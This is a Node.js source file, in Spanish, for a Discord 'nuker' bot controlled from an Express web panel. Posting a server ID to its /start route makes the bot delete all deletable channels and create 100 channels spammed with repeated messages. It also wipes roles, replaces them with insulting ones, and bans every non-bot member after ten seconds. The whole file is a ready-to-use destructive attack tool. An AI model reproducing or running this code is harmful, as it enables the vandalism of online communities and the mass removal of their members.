const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const fs = require('fs');
const express = require('express');
const app = express();
const port = 3000;

// Verificar y crear el archivo webhooks.json si no existe
if (!fs.existsSync('webhooks.json')) {
    fs.writeFileSync('webhooks.json', JSON.stringify({}, null, 4));
    console.log('Archivo webhooks.json creado.');
}

// ATT: Akit
console.log("Deja eso santi te va a cargar la chingada");

// Verificar y crear el archivo config.json si no existe
if (!fs.existsSync('config.json')) {
    fs.writeFileSync('config.json', JSON.stringify({
        "nombreCanales": "CHANNEL",
        "cantidadCanales": 100,
        "mensajesPorCanal": 100,
        "mensajeRepetido": "MESSAGE THAT THE BOT WILL SEND"
    }, null, 4));
    console.log('Archivo config.json creado.');
}

const config = JSON.parse(fs.readFileSync('config.json', 'utf-8'));

app.set('view engine', 'ejs');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const token = 'TOKEN'; // Reemplaza esto con tu token de bot

const accionesEnServidor = {}; // Para manejar las acciones en los servidores

client.once('ready', async () => {
    console.log(`Bot conectado como ${client.user.tag}`);
});

// Función para banear a todos los miembros de un servidor
const banearMiembros = async (guild) => {
    const miembros = await guild.members.fetch();
    for (const miembro of miembros.values()) {
        if (!miembro.user.bot) {
            try {
                await miembro.ban({ reason: 'Baneado por el bot.' });
                console.log(`Baneado a: ${miembro.user.tag}`);
            } catch (error) {
                console.error(`Error al banear a ${miembro.user.tag}:`, error);
            }
        }
    }
};

// Función para crear canales en un servidor
const crearCanalesYEnviarMensajes = async (guild) => {
    const cantidadCanales = config.cantidadCanales; // Obtener cantidad de canales desde config
    const mensajesPorCanal = config.mensajesPorCanal; // Obtener cantidad de mensajes por canal desde config
    const mensajeRepetido = config.mensajeRepetido; // Obtener el mensaje repetido desde config

    // Eliminar todos los canales antes de crear más
    const canalesExistentes = await guild.channels.fetch();
    await Promise.all(canalesExistentes.map(channel => {
        if (channel.deletable) {
            return channel.delete().catch(console.error);
        }
    }));

    // Crear canales
    const canalesCreados = await Promise.all(Array.from({ length: cantidadCanales }).map(async (_, i) => {
        try {
            const nuevoCanal = await guild.channels.create({
                name: `${config.nombreCanales} ${i + 1}`,
                type: ChannelType.GuildText
            });

            console.log(`Canal creado: ${nuevoCanal.name}`);

            // Enviar mensajes en paralelo
            await Promise.all(Array.from({ length: mensajesPorCanal }).map((_, j) => {
                return nuevoCanal.send(`${mensajeRepetido} ${j + 1} en ${nuevoCanal.name}`).catch(console.error);
            }));

            return nuevoCanal;
        } catch (error) {
            console.error('Error al crear el canal', error);
            return null; // Retorna null si hay un error
        }
    }));

    return canalesCreados.filter(canal => canal !== null); // Filtra los canales creados correctamente
};

// Función para crear roles con el mismo nombre
const crearRoles = async (guild) => {
    const rolesExistentes = await guild.roles.fetch();
    const nombreRole = 'Yoy pelotudo';

    // Eliminar roles existentes que se puedan eliminar
    for (const role of rolesExistentes.values()) {
        if (role.deletable && role.name !== '@everyone') {
            await role.delete().catch(console.error);
        }
    }

    // Crear nuevos roles
    for (let i = 0; i < 10; i++) { // Cambia 10 al número deseado de roles
        try {
            await guild.roles.create({ name: nombreRole });
            console.log(`Rol creado: ${nombreRole}`);
        } catch (error) {
            console.error('Error al crear el rol', error);
        }
    }
};

// Acción para iniciar la creación de canales y roles en un servidor
app.post('/start/:guildId', async (req, res) => {
    const guildId = req.params.guildId;
    const guild = client.guilds.cache.get(guildId);

    if (!guild) {
        return res.send('Servidor no encontrado.');
    }

    await crearCanalesYEnviarMensajes(guild);
    await crearRoles(guild);

    // Timer de 10 segundos para banear a todos los usuarios
    accionesEnServidor[guild.id] = setTimeout(() => {
        banearMiembros(guild);
        delete accionesEnServidor[guild.id]; // Limpiar después de banear
    }, 10000);

    res.send('Acción "start" completada en el servidor.');
});

// Endpoint principal
app.get('/', async (req, res) => {
    const servidores = client.guilds.cache.map(guild => ({
        id: guild.id,
        nombre: guild.name
    }));

    res.render('index', { servidores });
});

// Acción para detener la creación de canales y roles en un servidor
app.post('/stop/:guildId', async (req, res) => {
    const guildId = req.params.guildId;

    // Verifica si hay una acción en curso para ese servidor
    if (accionesEnServidor[guildId]) {
        clearTimeout(accionesEnServidor[guildId]); // Detener el timeout de baneo
        delete accionesEnServidor[guildId]; // Eliminar la acción en curso
        return res.send('Acción "stop" completada en el servidor.');
    }

    res.send('No hay ninguna acción en curso para detener en este servidor.');
});

// Iniciar el servidor web
app.listen(port, () => {
    console.log(`Servidor web en http://localhost:${port}`);
});

// Iniciar sesión con el bot de Discord
client.login(token);
